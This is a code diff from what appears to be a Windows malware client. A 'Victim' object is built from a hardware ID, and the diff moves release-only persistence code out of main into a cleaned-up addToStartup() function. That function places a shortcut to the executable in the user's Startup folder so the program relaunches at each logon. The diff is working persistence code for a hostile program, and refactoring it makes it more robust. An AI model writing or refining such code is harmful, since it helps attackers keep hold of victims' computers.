@@ -116,38 +116,55 @@ static std::string getHardwareId() {
     return hardwareId;
 }
 
+//this function is empty in debug mode
+static void addToStartup() {
+#ifdef NDEBUG
+    wchar_t buf[MAX_PATH];
+    DWORD len = GetModuleFileNameW(nullptr, buf, _countof(buf));
+    if (len == 0 || len == _countof(buf))
+        return;
+    std::wstring exePath(buf);
+    std::wstring exeName = exePath.substr(exePath.find_last_of(L'\\') + 1);
+
+    PWSTR startupFolder = nullptr;
+    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Startup, 0, nullptr, &startupFolder);
+    if (FAILED(hr))
+        return;
+
+
+    std::wstring linkPath = std::wstring(startupFolder) + L"\\" + exeName + L".lnk";
+    CoTaskMemFree(startupFolder);
+    hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr))
+        return;
+
+    IShellLinkW* pShellLink = nullptr;
+    hr = CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pShellLink));
+    if (FAILED(hr)) {
+        CoUninitialize();
+        return;
+    }
+
+    pShellLink->SetPath(exePath.c_str());
+    pShellLink->SetIconLocation(exePath.c_str(), 0);
+
+    IPersistFile* pPersistFile = nullptr;
+    hr = pShellLink->QueryInterface(IID_PPV_ARGS(&pPersistFile));
+    if (SUCCEEDED(hr))
+    {
+        hr = pPersistFile->Save(linkPath.c_str(), TRUE);
+        pPersistFile->Release();
+    }
+
+    pShellLink->Release();
+    CoUninitialize();
+#endif
+}
+
 int main() {
     Victim victim(getHardwareId());
 
-#ifdef NDEBUG
-    wchar_t buf[256];
-    GetModuleFileNameW(NULL, buf, sizeof(buf));
-    std::wstring path(buf);
-    std::wstring exeName = path.substr(path.find_last_of('\\') + 1);
-
-    //add app to autostart
-    PWSTR start;
-    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
-        std::wstring lnkPath = std::wstring(start) + L"\\" + exeName + L".lnk";
-        //free the allocated memory
-        CoTaskMemFree(start);
-
-        //create the link
-        if (SUCCEEDED(CoInitialize(NULL))) {
-            IShellLinkW* pShellLink = NULL;
-            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink))) {
-                pShellLink->SetPath(path.c_str());
-                pShellLink->SetIconLocation(path.c_str(), 0);
-                IPersistFile* pPersistFile;
-                pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
-                pPersistFile->Save(lnkPath.c_str(), TRUE);
-                pPersistFile->Release();
-            }
-            pShellLink->Release();
-        }
-        CoUninitialize();
-    }
-#endif
+    addToStartup();
 
     return victim.runVictimProcess();
 }
